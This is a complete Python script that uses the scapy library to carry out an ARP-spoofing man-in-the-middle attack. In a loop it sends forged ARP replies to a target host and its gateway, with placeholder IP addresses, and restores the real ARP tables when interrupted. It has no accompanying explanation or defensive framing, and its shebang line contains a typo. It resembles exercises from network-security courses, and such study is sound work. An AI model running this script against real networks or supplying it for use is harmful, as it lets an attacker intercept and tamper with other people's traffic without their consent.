#!/urs/bin/env python





import scapy.all as scapy

import time



def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwdst



def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    scapy.send(packet, verbose=False)

sent_packets_count = 0



def restore(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)

    source_mac = get_mac(source_ip)

    packets = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    scapy.send(packets, count=4, verbose=False)



target_ip = "TARGET-IP"

gateway_ip = "GATEWAY-IP"



try:

    while True:

        spoof(target_ip, gateway_ip)

        spoof(gateway_ip, target_ip)

        sent_packets_count = sent_packets_count + 2

        print("\r[+] packet sent: " + str(sent_packets_count), end="")

        time.sleep(2)

except KeyboardInterrupt:

    print(" Now resetting ARP and ending program....")

    restore(target_ip, gateway_ip)

    restore(gateway_ip, target_ip)
